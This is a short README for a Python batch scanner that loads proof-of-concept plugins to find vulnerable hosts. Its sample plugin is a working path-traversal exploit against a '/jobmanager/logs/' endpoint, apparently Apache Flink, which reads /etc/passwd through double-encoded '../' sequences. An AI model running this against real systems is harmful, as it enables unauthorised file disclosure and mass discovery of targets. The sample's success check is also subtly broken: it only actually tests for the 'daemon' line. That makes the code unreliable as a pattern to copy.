# simple_poc_auto_scanner
A simple python script: automatically import poc scripts for batch scanning of vulnerable hosts
All you have to do is add your poc script to the plugins folder
Your poc script should contain the following key functions, the sample format is as follows, to be called by the main scanning script:
```
def check_vuln(ip,port):
	http_proto = http_proto_judge(ip,port)#获取协议头
	url = "{proto}{ip}:{port}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd".format(proto=http_proto,ip=ip,port=port)
	try:
		res = requests.get(url=url,headers=headers,timeout=5)
		if "root:x:0:0:" and "daemon:x:1:1:daemon" in res.text:#判断是否存在passwd文件内容
			#print("Vuln exists")
			return True
		else:
			#print("No vuln")
			return False
	except Exception as msg:
		#print(msg)
		return False
```
